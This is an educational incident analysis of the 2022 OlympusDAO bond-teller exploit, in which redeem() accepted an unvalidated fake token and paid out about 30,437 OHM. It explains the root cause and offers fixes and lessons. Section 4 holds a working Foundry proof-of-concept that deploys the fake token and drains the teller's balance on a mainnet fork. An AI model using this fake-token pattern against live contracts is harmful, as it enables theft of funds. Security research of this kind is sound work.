# OlympusDAO — BondFixedExpiryTeller Fake Token redeem() Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10-21 |
| **Protocol** | OlympusDAO (Bond Teller) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$292,000 (30,437 OHM) |
| **Attack Tx** | [0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf](https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf) |
| **OHM Token** | [0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5](https://etherscan.io/address/0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5) |
| **BondFixedExpiryTeller** | [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156](https://etherscan.io/address/0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156) |
| **Attacker** | [0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be](https://etherscan.io/address/0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be) |
| **Attack Contract** | [0xa29e4fe451ccfa5e7def35188919ad7077a4de8f](https://etherscan.io/address/0xa29e4fe451ccfa5e7def35188919ad7077a4de8f) |
| **Root Cause** | The `redeem()` function did not validate whether the supplied token address was a genuine BondFixedExpiry token, allowing OHM to be drained via a fake token |
| **CWE** | CWE-20: Improper Input Validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/OlympusDao_exp.sol) |

---
## 1. Vulnerability Overview

OlympusDAO's `BondFixedExpiryTeller` contract provides a `redeem()` function that burns matured bond tokens and pays out the underlying asset (OHM). The `redeem()` function did not validate whether the token address passed as a parameter was actually a `BondFixedExpiry` token issued by this Teller. The attacker deployed a fake token whose `underlying()` function returns OHM and whose `expiry()` function returns a past timestamp. Upon calling `redeem(fakeToken, 30437e9)`, the Teller transferred 30,437 real OHM tokens.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable BondFixedExpiryTeller.redeem()
contract BondFixedExpiryTeller {
    mapping(ERC20BondToken => bool) public tokenCreated; // Registry of issued bond tokens

    function redeem(
        ERC20BondToken token_,  // ❌ No validation that this token was actually issued by this Teller
        uint256 amount_
    ) external override {
        // ❌ No tokenCreated[token_] check
        // Fake tokens can receive OHM as long as the maturity condition is met

        if (uint48(block.timestamp) < token_.expiry()) revert Teller_TokenNotMatured(token_.expiry());

        token_.burn(msg.sender, amount_); // Fake token's burn() does nothing

        token_.underlying().transfer(msg.sender, amount_); // ← OHM transferred
        // underlying() = OHM (returned by attacker's fake token)
    }
}

// ✅ Correct pattern — only allow issued tokens
contract SafeBondTeller {
    mapping(address => bool) public isIssuedToken;

    function redeem(address token_, uint256 amount_) external {
        // ✅ Verify the token was issued by this Teller
        require(isIssuedToken[token_], "Token not issued by this teller");

        IBondToken token = IBondToken(token_);
        require(block.timestamp >= token.expiry(), "Not matured");

        token.burn(msg.sender, amount_);
        token.underlying().transfer(msg.sender, amount_);
    }
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code available — bytecode only or source not verified

**Vulnerable function** — `redeem()`:
```solidity
// ❌ Root cause: `redeem()` function does not validate whether the supplied token address is a genuine BondFixedExpiry token, allowing OHM to be drained via a fake token
// Source code unverified — bytecode analysis required
// Vulnerability: `redeem()` function does not validate whether the supplied token address is a genuine BondFixedExpiry token, allowing OHM to be drained via a fake token
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy fake FakeToken
    │       ├─ underlying() → returns OHM address
    │       ├─ expiry() → returns past timestamp (already matured)
    │       └─ burn() → does nothing
    │
    ├─[2] Query OHM balance held by BondFixedExpiryTeller
    │       ohmBalance = OHM.balanceOf(teller)
    │       = 30,437 OHM
    │
    ├─[3] Call teller.redeem(FakeToken, 30437e9)
    │       ├─ FakeToken.expiry() < now → maturity check passes
    │       ├─ FakeToken.burn() → does nothing (no actual burn)
    │       ├─ FakeToken.underlying() → OHM address
    │       └─ ❌ OHM.transfer(attacker, 30437e9) executes
    │           No issuance validation performed
    │
    └─[4] 30,437 OHM (~$292,000) drained successfully
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// ⚡ Fake bond token — underlying() returns OHM
contract FakeBondToken {
    address public immutable OHM;

    constructor(address _ohm) {
        OHM = _ohm;
    }

    // ✅ Implements the functions called by the Teller
    function underlying() external view returns (address) {
        return OHM; // ← Returns OHM so the Teller sends OHM
    }

    function expiry() external view returns (uint48) {
        return uint48(block.timestamp - 1); // ← Past timestamp = already matured
    }

    function burn(address, uint256) external {
        // ❌ Does nothing — receives OHM without any actual burn
    }
}

contract OlympusDaoExploit is Test {
    IBondFixedExpiryTeller teller = IBondFixedExpiryTeller(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
    IERC20 OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_794_363);
    }

    function testExploit() public {
        address attacker = address(this);
        uint256 tellerOHM = OHM.balanceOf(address(teller));

        emit log_named_decimal_uint("[Before] Teller OHM balance", tellerOHM, 9);
        emit log_named_decimal_uint("[Before] Attacker OHM balance", OHM.balanceOf(attacker), 9);

        // [Step 1] Deploy fake bond token
        FakeBondToken fakeToken = new FakeBondToken(address(OHM));

        // [Step 2] Call redeem() with the fake token
        // ⚡ Teller does not validate whether the token was issued by it
        teller.redeem(address(fakeToken), tellerOHM);

        emit log_named_decimal_uint("[After] Teller OHM balance", OHM.balanceOf(address(teller)), 9);
        emit log_named_decimal_uint("[After] Attacker OHM balance", OHM.balanceOf(attacker), 9);
        assertEq(OHM.balanceOf(attacker), tellerOHM);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | redeem() validation bypass via fake token input |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Untrusted External Contract Call |
| **Attack Vector** | `redeem(fakeToken, ohmBalance)` — manipulation of `underlying()` return value |
| **Precondition** | `redeem()` does not check whether the token was issued by this Teller |
| **Impact** | Loss of 30,437 OHM (~$292,000) |

---
## 6. Remediation Recommendations

1. **Issued token whitelist**: When `redeem()` is called, verify that the token was issued by this Teller using the `tokenCreated[token_]` or `isIssuedToken[token_]` mapping.
2. **Deterministic token address verification**: Generate bond token addresses deterministically (CREATE2) and confirm that the supplied address matches the expected address.
3. **Validate `underlying()` return value**: Confirm that the address returned by `token_.underlying()` is an approved underlying asset address known to the Teller.

---
## 7. Lessons Learned

- **Trusting external contract return values**: Asset transfers must never be based solely on the return value of an external contract function such as `token_.underlying()`. If the return value originates from an attacker-controlled contract, it can be anything.
- **Importance of input parameter validation**: Whenever a function accepts a contract address as a parameter, a whitelist or validation logic is always required — especially when assets are transferred based on values returned from that address.
- **Simple and obvious vulnerability**: This attack lost $292,000 due to a single missing line of validation (`require(tokenCreated[token_])`). It is a case where the most basic check was absent from the most critical function.